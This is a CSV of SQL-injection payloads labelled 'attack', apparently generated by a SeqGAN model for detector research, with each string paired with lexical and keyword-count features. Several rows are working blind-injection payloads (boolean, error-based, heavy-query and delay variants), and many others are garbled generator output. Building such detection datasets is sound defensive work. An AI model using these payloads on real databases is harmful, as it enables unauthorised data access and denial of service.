label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ' where ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,443,347.0,41.0,3.6987212975799486,112.0,35.0,149.0,51.0,0.3227665706051873,0.10086455331412104,0.42939481268011526,0.14697406340057637,2.0,0.0,0.0,0.0,0.0,1.0,0.0,32.0,0.0,2.0,4.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,11.0
attack,-9148Unprnl3862,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,444,15.0,13.0,3.640223928941852,6.0,8.0,0.0,1.0,0.4,0.5333333333333333,0.0,0.06666666666666667,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,z-'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '1772nwcdb,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,445,69.0,32.0,4.182982672543618,24.0,16.0,22.0,7.0,0.34782608695652173,0.2318840579710145,0.3188405797101449,0.10144927536231885,2.0,0.0,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1"" where ,  =  =    =  '  =  '  )   2774    (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,446,45.0,15.0,2.6008218797881613,5.0,5.0,25.0,10.0,0.1111111111111111,0.1111111111111111,0.5555555555555556,0.2222222222222222,2.0,1.0,0.0,0.0,0.0,4.0,0.0,2.0,0.0,0.0,1.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1zb""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""nshyyg',umecper  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,447,385.0,40.0,3.624628471334643,108.0,45.0,168.0,64.0,0.2805194805194805,0.11688311688311688,0.43636363636363634,0.16623376623376623,1.0,2.0,0.0,0.0,0.0,2.0,0.0,34.0,0.0,3.0,1.0,22.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'g'  =  'x'  =  'u""  )   or   (  ""Uyg'uper(    =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,448,423.0,36.0,3.3170214939850102,107.0,47.0,203.0,66.0,0.25295508274231676,0.1111111111111111,0.4799054373522459,0.15602836879432624,7.0,2.0,0.0,0.0,0.0,5.0,0.0,41.0,0.0,0.0,1.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,18.0
attack,"-4462'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +''   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'wbk",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,449,301.0,41.0,3.766660129444186,76.0,47.0,131.0,47.0,0.25249169435215946,0.15614617940199335,0.43521594684385384,0.15614617940199335,4.0,0.0,1.0,0.0,1.0,3.0,0.0,26.0,0.0,1.0,3.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,10.0
attack,-8327 9643or '   ( char  121  (  =--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,450,36.0,18.0,3.5650795150307193,6.0,11.0,12.0,7.0,0.16666666666666666,0.3055555555555556,0.3333333333333333,0.19444444444444445,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0
attack,1'||  (  select ' where 6849  =  5485 or  f  )    or ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,451,53.0,22.0,3.520494919081738,16.0,9.0,21.0,7.0,0.3018867924528302,0.16981132075471697,0.39622641509433965,0.1320754716981132,2.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'||  (  select 'aujnbdnbdceil,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,452,30.0,17.0,3.894739663055176,19.0,1.0,5.0,5.0,0.6333333333333333,0.03333333333333333,0.16666666666666666,0.16666666666666666,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-1772n""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,453,152.0,32.0,4.0275804569830065,76.0,11.0,45.0,20.0,0.5,0.07236842105263158,0.29605263157894735,0.13157894736842105,2.0,2.0,1.0,0.0,1.0,2.0,0.0,6.0,1.0,0.0,2.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-44621""",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,454,7.0,6.0,2.521640636343318,0.0,5.0,0.0,2.0,0.0,0.7142857142857143,0.0,0.2857142857142857,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-9462 ""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""imubs",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,455,82.0,29.0,3.5554870712409494,17.0,16.0,37.0,12.0,0.2073170731707317,0.1951219512195122,0.45121951219512196,0.14634146341463414,0.0,2.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""c where 7522(   (  =  =  107as if",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,456,382.0,41.0,3.6973640048681222,117.0,42.0,166.0,57.0,0.306282722513089,0.1099476439790576,0.43455497382198954,0.14921465968586387,0.0,2.0,0.0,0.0,0.0,3.0,0.0,36.0,0.0,2.0,4.0,13.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,11.0
attack,-2180f%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,457,14.0,10.0,3.0930692077718898,1.0,4.0,4.0,5.0,0.07142857142857142,0.2857142857142857,0.2857142857142857,0.35714285714285715,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-9462""rjecrchar  =  =  * char  =    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,458,36.0,15.0,3.236161353104503,13.0,4.0,13.0,6.0,0.3611111111111111,0.1111111111111111,0.3611111111111111,0.16666666666666666,0.0,1.0,1.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,459,133.0,31.0,4.209440641386374,74.0,9.0,35.0,15.0,0.556390977443609,0.06766917293233082,0.2631578947368421,0.11278195488721804,2.0,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""i'  =  '""  )   or   (  ""    (g""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""fychar  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,460,766.0,41.0,3.4638485111229453,198.0,91.0,355.0,122.0,0.2584856396866841,0.11879895561357702,0.46344647519582244,0.15926892950391644,2.0,6.0,0.0,0.0,0.0,6.0,0.0,73.0,0.0,3.0,1.0,36.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,22.0
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,461,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-4873 where 6093  =  =hn    (  6503 4018  121,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,462,45.0,19.0,3.6058970643159376,7.0,19.0,15.0,4.0,0.15555555555555556,0.4222222222222222,0.3333333333333333,0.08888888888888889,0.0,0.0,1.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1m'%'  =  's""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,463,19.0,8.0,2.5239860659612976,2.0,1.0,8.0,8.0,0.10526315789473684,0.05263157894736842,0.42105263157894735,0.42105263157894735,3.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-9148x%(,Uzn(  =""  =  ""jtnschar  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,464,34.0,22.0,4.065260267657296,12.0,4.0,8.0,10.0,0.35294117647058826,0.11764705882352941,0.23529411764705882,0.29411764705882354,0.0,2.0,1.0,0.0,0.0,3.0,0.0,2.0,1.0,0.0,1.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,465,249.0,38.0,3.786040554532689,74.0,29.0,100.0,46.0,0.2971887550200803,0.11646586345381527,0.40160642570281124,0.18473895582329317,2.0,2.0,0.0,0.0,0.0,2.0,0.0,22.0,2.0,2.0,4.0,12.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,9.0
attack,"1%'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '    74172583   asssr h$",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,466,322.0,42.0,3.960500629063991,98.0,49.0,126.0,49.0,0.30434782608695654,0.15217391304347827,0.391304347826087,0.15217391304347827,4.0,0.0,0.0,0.0,0.0,3.0,0.0,24.0,1.0,2.0,4.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,11.0
attack,"-8919)      ""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""*  3038h'%cw  or r  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,467,394.0,33.0,3.3608114731992025,101.0,54.0,182.0,57.0,0.2563451776649746,0.13705583756345177,0.4619289340101523,0.1446700507614213,1.0,2.0,1.0,0.0,1.0,3.0,0.0,37.0,1.0,0.0,1.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,18.0
attack,1'   )    as pouh=,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,468,18.0,11.0,2.836591668108979,6.0,1.0,8.0,3.0,0.3333333333333333,0.05555555555555555,0.4444444444444444,0.16666666666666666,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-7731%g5389ur'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'U",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,469,215.0,34.0,3.654806747372275,115.0,19.0,61.0,20.0,0.5348837209302325,0.08837209302325581,0.2837209302325581,0.09302325581395349,2.0,0.0,1.0,0.0,1.0,1.0,0.0,8.0,1.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,-1617  select 2*  (  =  6093char  1087,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,470,38.0,21.0,3.858226584307434,10.0,13.0,11.0,4.0,0.2631578947368421,0.34210526315789475,0.2894736842105263,0.10526315789473684,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-7731ppeedu,up",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,471,14.0,9.0,3.0391486719030705,8.0,4.0,0.0,2.0,0.5714285714285714,0.2857142857142857,0.0,0.14285714285714285,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%'   )     or 2724 4018  =  =    (  (  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,472,40.0,14.0,2.619240704636849,2.0,9.0,22.0,7.0,0.05,0.225,0.55,0.175,1.0,0.0,0.0,0.0,0.0,2.0,0.0,3.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1"" 3455 75224018  =or or char  *  = and",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,473,39.0,19.0,3.7581324032382177,11.0,13.0,11.0,4.0,0.28205128205128205,0.3333333333333333,0.28205128205128205,0.10256410256410256,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,4.0
